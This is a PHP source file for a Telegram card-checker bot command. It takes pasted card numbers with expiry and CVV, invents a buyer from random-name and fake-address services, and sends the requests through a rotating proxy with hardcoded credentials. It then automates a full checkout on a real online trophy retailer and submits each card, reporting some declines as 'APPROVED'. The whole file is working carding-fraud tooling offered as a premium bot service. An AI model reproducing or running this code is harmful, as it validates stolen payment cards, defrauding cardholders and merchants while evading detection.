<?php

use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Exception\RequestException;

list($cmd) = explode(" ", $message);
if($cmd == "/sf" or $cmd == ".sf" or $cmd == "!sf"){
$NameGater ='ShBraintre';
$gateway = '/sf :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Payflow AVS</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!sf card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

$retry = 0;

start:
    



if ($retry == 7) {
    bot('editMessageText', [
        'chat_id' => $chatId,
        'message_id' => $messageidtoedit,
        'text' => "<b>#Error-in-process</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    exit;
}
$rotate = rotate();
$socks5 = socks5();

$client = new Client();
$cookies = new CookieJar();

$response = $client->request('GET', 'https://randomuser.me/api/?nat=gb');
$data = json_decode($response->getBody(), true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) . rand(111,33452).'@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];


$res = $client->request('GET', "https://www.fakexy.com/fake-address-generator-us");
$html = (string) $res->getBody();
$dom = new DOMDocument;
@$dom->loadHTML($html);
$xpath = new DOMXPath($dom);
$street = $xpath->query('//td[text()="Street"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$city = $xpath->query('//td[text()="City/Town"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$state = $xpath->query('//td[text()="State/Province/Region"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$zip = $xpath->query('//td[text()="Zip/Postal Code"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$phone = $xpath->query('//td[text()="Phone Number"]/following-sibling::td')->item(0)->nodeValue ?? "none";
$country = $xpath->query('//td[text()="Country"]/following-sibling::td')->item(0)->nodeValue ?? "none";

$password = substr(str_shuffle('abcdefMNOPQ56789_!'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Il'.$firstname.'is" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$curl = new CurlX;


$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos

$socks5 = "all.dc.smartproxy.com:10000";
$rotate = "Testingthis123:Testingpassword12+";


while ($retries < $maxRetries) {
    try { 

        if(strlen($ano) == 2 ){
            $ano = "20".$ano;
        }
          
        if ($mes < 10) {
              $mes = substr($mes, -1);
        }

        $proxy = ['https' => 'http://' . $rotate . '@' . $socks5];

        $headers = [
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/halloween-trophy-w-year-trim/t2763f2253/',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'X-Requested-With' => 'XMLHttpRequest',

        ];
        $postdata = 'F=AddToCart&ItemId=42870&OrderItemId=0&Logo=&Qty=1&Recipient=Myself&SpecificRecipient=&ValueId=401&IsPersonalization=false&RedirectPersonalization=true&RedirectPersonalizationReview=false&RedirectRegistration=false&RedirectShoppingCart=false&RedirectToItemDetails=false';
        $response = $client->request('POST','https://www.awardsco.com/ajax/store/ajax.aspx',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        if ($response->getStatusCode() != 200) {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }


        $headers = [
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/halloween-trophy-w-year-trim/t2763f2253-a-93-s/personalize/?OrderItemId=736362',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'X-Requested-With' => 'XMLHttpRequest',
        ];
        $postdata = 'F=AddToCart&ItemId=42870&OrderItemId=736362&Logo=&Qty=1&Recipient=Myself&SpecificRecipient=&ValueId=624&IsPersonalization=true&RedirectPersonalization=false&RedirectPersonalizationReview=true&RedirectRegistration=false&RedirectShoppingCart=false&RedirectToItemDetails=false&PersOption=&LogoFileName=&LogoFileName_Upload=&DocumentFileName=&DocumentFileName_Upload=&IsAgreed=true&PersAddLater=false&PersClassification=%5B%5D&PersNameplateMaster=%7B%220_0%22%3A%7B%22l%22%3A%22%22%2C%22b%22%3A%22false%22%2C%22fs%22%3A%2240px%22%7D%2C%220_1%22%3A%7B%22l%22%3A%22%22%2C%22b%22%3A%22false%22%2C%22fs%22%3A%2240px%22%7D%2C%220_2%22%3A%7B%22l%22%3A%22%22%2C%22b%22%3A%22false%22%2C%22fs%22%3A%2240px%22%7D%7D&PersNameplate=%7B%220_0%22%3A%7B%22l%22%3A%22'.$firstname.'%22%2C%22tl%22%3A%22'.$firstname.'%22%2C%22b%22%3Afalse%2C%22fs%22%3A%2240px%22%7D%2C%220_1%22%3A%7B%22l%22%3A%22%22%2C%22tl%22%3A%22%22%2C%22b%22%3Afalse%2C%22fs%22%3A%2240px%22%7D%2C%220_2%22%3A%7B%22l%22%3A%22%22%2C%22tl%22%3A%22%22%2C%22b%22%3Afalse%2C%22fs%22%3A%2240px%22%7D%7D&PersThreshold=false';
        $response = $client->request('POST','https://www.awardsco.com/ajax/store/ajax.aspx',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        if ($response->getStatusCode() != 200) {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }

        $response = $client->request('GET','https://www.awardsco.com/halloween-trophy-w-year-trim/t2763f2253-a-93-s/personalize/review/?OrderItemId=736362',[
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        if ($response->getStatusCode() != 200) {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }

        $view = trim(strip_tags(GetStr($response->getBody(), '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"')));
        $viewgen = trim(strip_tags(GetStr($response->getBody(), '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"')));
        $even = trim(strip_tags(GetStr($response->getBody(), '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"')));

        if ($view == 'null'||$viewgen == 'null'||$even == 'null') {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }
        $headers = [
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language' => 'es-419,es;q=0.9',
            'Cache-Control' => 'max-age=0',
            'Connection' => 'keep-alive',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/halloween-trophy-w-year-trim/t2763f2253-a-93-s/personalize/review/?OrderItemId=736362',
            'Upgrade-Insecure-Requests' => '1',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
        ];
        $postdata = '__EVENTTARGET=&__EVENTARGUMENT=&hdnSubDirectory=&CT_Header_0%24txtKeyword=&CT_Header_0%24cCheckDeliveryDate%24txtZipCode=&CT_Header_0%24cCheckDeliveryDate%24drpState=0&CT_Main_0%24btnAddToCart=Add+To+Cart&__VIEWSTATEGENERATOR='.$viewgen.'&__EVENTVALIDATION='.urlencode($even).'&__VIEWSTATE='.urlencode($view).'';
        $response = $client->request('POST','https://www.awardsco.com/halloween-trophy-w-year-trim/t2763f2253-a-93-s/personalize/review/?OrderItemId=736362',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);
        if ($response->getStatusCode() != 200) {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }

        $view = trim(strip_tags(GetStr($response->getBody(), '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"')));
        $viewgen = trim(strip_tags(GetStr($response->getBody(), '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"')));
        $even = trim(strip_tags(GetStr($response->getBody(), '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"')));
        if ($view == 'null'||$viewgen == 'null'||$even == 'null') {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }

        $headers = [
            'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language' => 'es-419,es;q=0.9',
            'Cache-Control' => 'max-age=0',
            'Connection' => 'keep-alive',
            'Content-Type' => 'application/x-www-form-urlencoded',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/shopping-cart/',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
    
        ];
        $postdata = '__EVENTTARGET=CT_Main_0%24btnCheckout&__EVENTARGUMENT=&__LASTFOCUS=&hdnSubDirectory=&CT_Header_0%24txtKeyword=&CT_Header_0%24cCheckDeliveryDate%24txtZipCode=&CT_Header_0%24cCheckDeliveryDate%24drpState=0&CT_Main_0%24sesMain%24drpShippingMethod=7&CT_Main_0%24sesMain%24txtZipCode=10080&CT_Main_0%24StoreCartTools1%24drpContinue=&CT_Main_0%24StoreCartTools1%24txtViewEmailAddress=&CT_Main_0%24txtPromotionCode=&__VIEWSTATEGENERATOR='.$viewgen.'&__EVENTVALIDATION='.urlencode($even).'&__VIEWSTATE='.urlencode($view).'';
        $response = $client->request('POST','https://www.awardsco.com/shopping-cart/',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);
        if ($response->getStatusCode() != 200) {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }
        $RecipientId = trim(strip_tags(GetStr($response->getBody(), '<input type="hidden" id="hdnRecipientIdShipping0" value="', '"')));

        if ($RecipientId == 'null') {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }
        $headers = [
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/checkout/',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'X-Requested-With' => 'XMLHttpRequest',
        ];
        $postdata = 'F=GetShippingCosts&RecipientId='.$RecipientId.'&State=NY&Country=US&Zip=10080';
        $response = $client->request('POST','https://www.awardsco.com/ajax/store/checkout.aspx',[
            'connect_timeout' => 10,
            'timeout' => 5,
            'body' => $postdata,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);
        if ($response->getStatusCode() != 200) {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }


        $DeliveryDay = trim(strip_tags(GetStr($response->getBody(), '"DeliveryDay":"', '"')));
        if ($DeliveryDay == 'null') {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }
        $headers = [
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/checkout/',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'X-Requested-With' => 'XMLHttpRequest',
        ];
        $postdata = 'F=UpdateDeliveryMethod&RecipientId='.$RecipientId.'&ShippingMethodId=1&Country=US&Zip=10080&City=New+York&State=NY';
        $response = $client->request('POST','https://www.awardsco.com/ajax/store/checkout.aspx',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        $date = new DateTime($DeliveryDay);
        $formattedDate = $date->format('D M d Y H:i:s') . ' GMT-0500 (hora de Colombia)';

        $headers = [
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language' => 'es-419,es;q=0.9',
            'Connection' => 'keep-alive',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/checkout/',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'X-Requested-With' => 'XMLHttpRequest',
        ];
        $postdata = 'F=SubmitShipping&PreviousStep=Billing&RecipientId='.$RecipientId.'&ShippingMethodId=ShippingMethodId_0_1&TaxNo=&IsTaxExempt=0&RequestedShipDate='.urlencode($formattedDate).'&AddressId=&FirstName='.$firstname.'&LastName='.$lastname.'&Company=ORG&Address1='.urlencode($street).'&Address2=&City=New+York&State=NY&Region=&Country=US&Zip=10080&Phone='.urlencode($phone).'&EveningPhone='.urlencode($phone).'&IsSameAddress=true';
        $response = $client->request('POST','https://www.awardsco.com/ajax/store/checkout.aspx',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        $headers = [
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/checkout/',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'X-Requested-With' => 'XMLHttpRequest',
        ];
        $postdata = 'F=SubmitBilling&BillingAddressId=&FirstName='.$firstname.'&LastName='.$lastname.'&Company=ORG&Address1='.urlencode($street).'&Address2=&City=Collierville&Region=&State=TN&Country=&Zip=38017&Phone='.urlencode($phone).'&EveningPhone='.urlencode($phone).'&Email='.urlencode($email).'&EmailConfirm='.urlencode($email).'';
        $response = $client->request('POST','https://www.awardsco.com/ajax/store/checkout.aspx',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        $headers = [
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/checkout/',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'X-Requested-With' => 'XMLHttpRequest',
        ];
        $option = [
            "4"=>"1",
            "5"=>"2",
            "6"=>"4",
            "3"=>"3",
        ];
        
        $CardType = $option[substr($cc, 0, 1)];
        $postdata = 'F=SubmitPayment&PaymentType=CC&CardType='.$CardType.'&CardNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'&CVV='.$cvv.'&IsTaxExempt=0&TaxExemptNumber=';        $response = $client->request('POST','https://www.awardsco.com/ajax/store/checkout.aspx',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);
        if ($response->getStatusCode() != 200) {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }

        $headers = [
            'Accept' => 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin' => 'https://www.awardsco.com',
            'Referer' => 'https://www.awardsco.com/checkout/',
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
            'X-Requested-With' => 'XMLHttpRequest',
        ];
        $postdata = 'F=SubmitReview&PaymentType=CC&CardType=1&CardNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'&CVV='.$cvv.'&IsTaxExempt=0&TaxExemptNumber=&CreateAccount=true&ReceiveNewsletter=true&Newsletters=40&Username='.urlencode($email).'&NewsletterHTML=true&NewsletterText=false&Password='.$password.'&ConfirmPassword='.$password.'&Comments=';
        
        $response = $client->request('POST','https://www.awardsco.com/ajax/store/checkout.aspx',[
            'body' => $postdata,
            'connect_timeout' => 10,
            'timeout' => 5,
            'headers' => $headers,
            'cookies' => $cookies,
            'proxy' => $proxy,
        ]);

        if ($response->getStatusCode() != 200) {
            throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
        }

        if(strlen($mes) == 1){
            $mes = "0".$mes;
        }

        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            $text = Textretries();
            bot('editMessageText', ['chat_id'=>$chatId, 'message_id'=>$messageidtoedit, 'text'=>$text, 'parse_mode'=>'html', 'reply_to_message_id'=> $message_id]);
            return;
        }
    }
}
$Error = trim(strip_tags(GetStr($response->getBody(), '"Error":"', '"')));

$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if(substr_count($response->getBody(), 'CVV2 Mismatch')){
$status = "APPROVED ✅ ";
$response = "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number";
}elseif(substr_count($response->getBody(), 'Gateway Rejected: cvv')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: cvv";
}elseif(substr_count($response->getBody(), 'Insufficient Funds')){
$status = "APPROVED ✅ ";
$response = "Insufficient Funds";
}elseif(substr_count($response->getBody(), 'Gateway Rejected: avs')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: avs";
}elseif(substr_count($response->getBody(), 'Add a new payment method')){
$status = "APPROVED ✅ ";
$response = "APPROVED";
}else{
$status = "DECLINED #DEAD ❌";
$response = $Error;
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

?>

